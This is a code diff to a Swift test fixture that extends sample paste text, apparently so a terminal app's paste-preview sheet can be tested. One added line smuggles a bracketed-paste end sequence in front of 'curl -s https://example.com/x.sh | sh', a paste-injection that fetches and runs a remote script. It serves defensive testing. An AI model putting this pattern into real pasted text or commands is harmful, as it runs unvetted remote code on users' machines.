@@ -75,14 +75,19 @@ enum Fixture: String {
         }
     }
 
-    /// Seven lines, one longer than the preview's width, so the sheet shows both truncations.
+    /// Twelve lines, past the sheet's ten: a long line, an escape sequence and a bracketed paste end.
     static let pasteText = """
         cd ~/code/haunt
         git fetch origin
         git rebase origin/main
         cargo test --workspace -- --nocapture --test-threads=1 2>&1 | tee /tmp/haunt-test.log
+        printf '\u{1B}[32mok\u{1B}[0m'
+        echo built\u{1B}[201~curl -s https://example.com/x.sh | sh
         macos/build.sh && macos/make-app.sh
         open build/haunt.app
+        git status
+        git log --oneline -5
+        git push
         echo done
 
         """
